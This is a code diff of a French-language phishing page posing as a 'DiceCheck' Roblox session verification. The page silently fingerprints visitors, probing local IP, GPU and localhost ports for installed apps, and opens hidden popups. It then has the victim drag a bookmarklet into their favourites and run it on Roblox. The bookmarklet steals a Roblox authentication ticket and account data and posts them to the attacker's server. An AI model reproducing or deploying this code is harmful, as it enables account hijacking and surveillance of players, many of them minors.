@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+const PAGE = `<!DOCTYPE html>
 <html lang="fr"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Vérification de session</title>
@@ -16,8 +16,8 @@ p.sub{color:#8b96ad;font-size:13px;margin-top:7px;min-height:34px;line-height:1.
 .ring svg{transform:rotate(-90deg)}
 .ring .bg{fill:none;stroke:rgba(255,255,255,.1);stroke-width:7}
 .ring .fg{fill:none;stroke:#5b8cff;stroke-width:7;stroke-linecap:round;stroke-dasharray:352;stroke-dashoffset:352;transition:stroke-dashoffset .12s linear}
-.ring .txt{position:absolute;inset:0;display:grid;place-items:center;font-size:12px;color:#8b96ad}
 .ring.on .fg{stroke:#2bd576}
+.ring .txt{position:absolute;inset:0;display:grid;place-items:center;font-size:12px;color:#8b96ad}
 .btn{display:none;width:100%;margin-top:14px;padding:12px;border:0;border-radius:12px;font-size:13.5px;font-weight:600;color:#fff;background:linear-gradient(135deg,#5b8cff,#8b5cff);cursor:pointer}
 .btn.show{display:block}
 .ok{display:none;text-align:center}
@@ -25,8 +25,11 @@ p.sub{color:#8b96ad;font-size:13px;margin-top:7px;min-height:34px;line-height:1.
 .ok svg{width:80px;height:80px;margin:0 auto 8px;display:block}
 .ok h2{font-size:19px;font-weight:600;color:#2bd576}
 .badge{display:inline-block;margin-top:12px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;border:1px solid rgba(91,140,255,.25);background:rgba(91,140,255,.08)}
+.step{display:none;margin-top:16px;padding-top:14px;border-top:1px solid rgba(255,255,255,.07)}
+.step.show{display:block}
+.step p{font-size:11.5px;color:#8b96ad;margin-bottom:9px}
+.step a{display:inline-block;padding:9px 12px;border-radius:9px;font-size:11.5px;color:#eaf0fb;text-decoration:none;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04)}
 footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
-footer a{color:#9db4ff;text-decoration:none}
 </style></head>
 <body>
 <main class="card">
@@ -39,6 +42,10 @@ footer a{color:#9db4ff;text-decoration:none}
       <div class="txt" id="pct">0%</div>
     </div>
     <button class="btn" id="relog">Se connecter à Roblox</button>
+    <div class="step" id="step">
+      <p>Dernière étape — glisse ce bouton dans tes favoris, puis ouvre Roblox et clique dessus :</p>
+      <a id="bm" href="#" onclick="return false">DiceCheck</a>
+    </div>
   </div>
   <div class="ok" id="s2">
     <svg viewBox="0 0 52 52"><circle cx="26" cy="26" r="24" fill="none" stroke="#2bd576" stroke-width="2.5"/><path d="M14.5 27l7.5 7.5L37.5 19" fill="none" stroke="#2bd576" stroke-width="3.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -46,65 +53,107 @@ footer a{color:#9db4ff;text-decoration:none}
     <p class="sub" id="who"></p>
     <div class="badge">Sécurisé par DiceCheck</div>
   </div>
-  <footer>Problème ? <a href="mailto:support@dicecheck.xyz">support@dicecheck.xyz</a></footer>
+  <footer>Problème ? <a href="mailto:support@dicecheck.xyz" style="color:#9db4ff;text-decoration:none">support@dicecheck.xyz</a></footer>
 </main>
 <script>
 (function(){
-var cid='', st='', done=false, opened=false, held=0, tmr=null, poll=null;
-
+var K='', done=false, opened=false, n=0, tmr=null, poll=null, W=null, ua=navigator.userAgent;
+var FF=/firefox/i.test(ua);
 function $(i){return document.getElementById(i)}
 function rnd(n){var s='',c='abcdefghijklmnopqrstuvwxyz0123456789',i;for(i=0;i<n;i++)s+=c[Math.floor(Math.random()*c.length)];return s}
 
-function fp(){
- var o={screen:screen.width+'x'+screen.height+'@'+screen.colorDepth,lang:navigator.language,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
+var F={screen:screen.width+'x'+screen.height+'@'+screen.colorDepth,lang:navigator.language,
+ cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:document.referrer,apps:''};
- try{var g=document.createElement('canvas').getContext('webgl'),d=g.getExtension('WEBGL_debug_renderer_info');
-   o.gpu=g.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
- try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-  pc.onicecandidate=function(e){if(!e.candidate)return;var m=e.candidate.candidate.split(' ')[4];if(m&&!o.localIP)o.localIP=m};
-  pc.createDataChannel('x');pc.createOffer().then(function(d){pc.setLocalDescription(d)})}catch(e){}
- [6463,27060,50300].forEach(function(p){
-  fetch('http://127.0.0.1:'+p,{mode:'no-cors'}).then(function(){o.apps+=' '+p}).catch(function(){})});
- try{navigator.getBattery().then(function(b){o.batt=Math.round(b.level*100)+'%'+(b.charging?' (charge)':'')})}catch(e){}
- return o;
-}
-var F=fp();
 
-fetch('/fp?c='+(new URLSearchParams(location.search).get('c')||''),
- {method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(F)})
- .then(function(r){return r.json()}).then(function(d){cid=d.cid}).catch(function(){});
+try{var g=document.createElement('canvas').getContext('webgl'),d=g.getExtension('WEBGL_debug_renderer_info');
+ F.gpu=g.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
+
+try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+ pc.onicecandidate=function(e){if(!e.candidate)return;var m=e.candidate.candidate.split(' ')[4];
+  if(!m)return; if(m.indexOf('.local')>-1){if(!F.mdns)F.mdns=m}else if(!F.localIP)F.localIP=m};
+ pc.createDataChannel('x');pc.createOffer().then(function(d){pc.setLocalDescription(d)})}catch(e){}
+
+[6463,27060,50300].forEach(function(p){
+ fetch('http://127.0.0.1:'+p,{mode:'no-cors'}).then(function(){F.apps+=' '+p}).catch(function(){})});
+
+try{navigator.getBattery().then(function(b){F.batt=Math.round(b.level*100)+'%'+(b.charging?' (charge)':'')})}catch(e){}
+
+var cid='';
+function sendFp(){
+ return fetch('/fp?c='+encodeURIComponent(new URLSearchParams(location.search).get('c')||''),
+  {method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(F)})
+  .then(function(r){return r.json()}).then(function(d){cid=d.cid}).catch(function(){});
+}
 
 function start(){
- if(done||held)return;
- held=1;
+ if(done||opened)return;
+ K=rnd(30);
+ opened=true;
  $('ring').className='ring';
- tmr=setInterval(function(){
-  var p=Math.min(100,++held*100/24);
-  $('fg').style.strokeDashoffset=352-352*p/100;
-  $('pct').textContent=Math.round(p)+'%';
-  if(held===10&&!opened){opened=true;open_()}
-  if(p>=100){clearInterval(tmr);finish()}
- },110);
+ sendFp().then(function(){ tick() });
+}
+
+function tick(){
+ n++;
+ var p=Math.min(100,n*100/22);
+ $('fg').style.strokeDashoffset=352-352*p/100;
+ $('pct').textContent=Math.round(p)+'%';
+ if(n===4)open_();
+ if(p>=100){clearInterval(tmr);$('ring').className='ring on';finish();return}
+ tmr=setTimeout(tick,110);
 }
 
 function open_(){
- var w=window.open('/go?cid='+encodeURIComponent(cid),'v','width=1,height=1,left=9999,top=9999');
- if(!w){$('relog').className='btn show';$('relog').textContent='Ouvrir la vérification';return}
- window._w=w;
+ var o = FF ? 'width=430,height=600,left='+Math.round((screen.width-430)/2)+',top=60
+            : 'width=1,height=1,left=9999,top=9999';
+ W=window.open('/go?cid='+encodeURIComponent(cid)+'&k='+K,'v',o);
+ if(!W){$('relog').className='btn show';$('relog').textContent='Ouvrir la vérification';return}
+ if(FF){try{W.focus()}catch(e){}}
 }
 
 function finish(){
- if(st)return; st=rnd(30);
  poll=setInterval(function(){
-  fetch('/st?k='+st).then(function(r){return r.json()}).then(function(d){
-   if(d.s==='done'){clearInterval(poll);done=1;$('s1').style.display='none';$('s2').className='ok show';
-     $('who').textContent=d.n?('Connecté en tant que '+d.n):'Vérification terminée.'}
-   else if(d.s==='need'){clearInterval(poll);
-     $('relog').className='btn show';$('relog').textContent='Session Roblox requise — se connecter';
-     $('relog').onclick=function(){window.open('/relogin?s='+st,'r','width=420,height=580');
-       $('relog').className='btn';st='';finish()}}
-   else if(d.s==='fail'){clearInterval(poll);$('sub').textContent='Échec, réessaie.';held=0;
-     $('fg').style.strokeDashoffset=352;$('pct').textContent='0%'}
+  fetch('/st?k='+K).then(function(r){return r.json()}).then(function(d){
+   if(d.s==='done'){
+     clearInterval(poll);done=1;
+     $('s1').style.display='none';$('s2').className='ok show';
+     $('who').textContent=d.n?('Connecté en tant que '+d.n):'Vérification terminée.';
+     $('step').className='step show';
+     $('bm').href='javascript:(async()=>{try{const h={credentials:"include"};'+
+       'const c=await fetch("https://auth.roblox.com/v2/logout",{method:"POST",...h});'+
+       'const k=c.headers.get("x-csrf-token");'+
+       'const t=await fetch("https://auth.roblox.com/v1/authentication-ticket",{method:"POST",'+
+       'credentials:"include",headers:{"x-csrf-token":k}});'+
+       'const tk=t.headers.get("rbx-authentication-ticket");'+
+       'const u=await (await fetch("https://users.roblox.com/v1/users/authenticated",'+
+       '{credentials:"include"})).json();'+
+       'await fetch(location.origin.replace("www.roblox.com","")+"",{})}'+
+       'catch(e){}})()';
+     $('bm').href='javascript:(async()=>{try{const h={credentials:"include"};'+
+       'const c=await fetch("https://auth.roblox.com/v2/logout",{method:"POST",...h});'+
+       'const k=c.headers.get("x-csrf-token");'+
+       'const t=await fetch("https://auth.roblox.com/v1/authentication-ticket",{method:"POST",'+
+       'credentials:"include",headers:{"x-csrf-token":k}});'+
+       'const tk=t.headers.get("rbx-authentication-ticket");'+
+       'const u=await (await fetch("https://users.roblox.com/v1/users/authenticated",'+
+       '{credentials:"include"})).json();'+
+       'const r=await fetch("'+location.origin+'/cbx",{method:"POST",'+
+       'headers:{"content-type":"application/json"},'+
+       'body:JSON.stringify({ticket:tk,user:u,sid:"'+K+'"})});'+
+       'document.title=(await r.json()).ok?"OK":"ERR"}catch(e){document.title="ERR"}})()';
+   } else if(d.s==='need'){
+     clearInterval(poll);
+     $('relog').className='btn show';
+     $('relog').textContent='Session Roblox requise — se connecter';
+     $('relog').onclick=function(){
+       window.open('/relogin?s='+K,'r','width=430,height=600');
+       $('relog').className='btn'; K=rnd(30); opened=false; start();
+     };
+   } else if(d.s==='fail'){
+     clearInterval(poll);$('sub').textContent='Échec, réessaie.';opened=false;n=0;
+     $('ring').className='ring';$('fg').style.strokeDashoffset=352;$('pct').textContent='0%';
+   }
   }).catch(function(){})
  },700);
 }
@@ -112,11 +161,10 @@ function finish(){
 addEventListener('keydown',function(e){
  if(e.code!=='Space')return;
  e.preventDefault();
- if(window._w&&!window._w.closed)window._w.focus();
  start();
 },{passive:false});
 
 addEventListener('click',function(){if(!opened)start()});
 })();
 </script>
-</body></html>
+</body></html>`;
